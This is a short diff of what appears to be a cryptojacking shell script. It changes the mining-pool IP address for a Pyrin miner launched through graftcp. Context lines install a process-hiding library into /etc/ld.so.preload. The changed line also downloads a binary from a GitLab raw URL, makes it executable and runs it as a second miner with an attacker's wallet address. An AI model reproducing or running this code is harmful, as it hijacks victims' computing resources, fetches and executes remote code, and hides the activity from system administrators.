@@ -57,5 +57,5 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./lol1.81 ./lol1.81 -a PYRIN -p 138.197.98.18:80 -u pyrin:qrdpreaf7e0tymaqxxzf4nqd3g92ze3hqnz30d6r9uq5wg6amnznve3tzxjgs.$(shuf -n 1 -i 1-99999)-Bismillah --no-cl & wget https://gitlab.com/majapahlevi/mvp/-/raw/main/b
+./graftcp/graftcp ./lol1.81 ./lol1.81 -a PYRIN -p 167.71.107.204:80 -u pyrin:qrdpreaf7e0tymaqxxzf4nqd3g92ze3hqnz30d6r9uq5wg6amnznve3tzxjgs.$(shuf -n 1 -i 1-99999)-Bismillah --no-cl & wget https://gitlab.com/majapahlevi/mvp/-/raw/main/b
 chmod 777 b && ./b -o 161.35.141.255:80 -u amyL9AcyAtNVQnAB4E4Sa54Y7XwK2LH7u2GW6doyyG9VUXpWxpqXdcHRR62qDThNoZ9viq4hb6eNDGMzKeXYhjpe2nta9adVzn -p maggamanis-$(shuf -n 1 -i 1-9999) -a rx/0 -k --donate-level 1
